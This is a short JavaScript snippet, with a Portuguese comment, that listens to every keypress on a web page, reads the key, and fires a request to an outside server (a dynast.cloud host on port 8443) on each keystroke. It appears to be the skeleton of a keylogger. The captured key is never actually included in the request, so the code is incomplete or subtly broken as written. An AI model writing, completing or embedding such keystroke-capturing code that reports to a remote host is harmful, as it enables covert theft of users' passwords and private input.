document.addEventListener('keydown', (event) => {
    const key = event.key; // Obter a tecla pressionada
    const xhr = new XMLHttpRequest();
    xhr.open('GET', 'https://sao-paulo-0-alpaca.dynast.cloud:8443/', true);
    xhr.send();
});
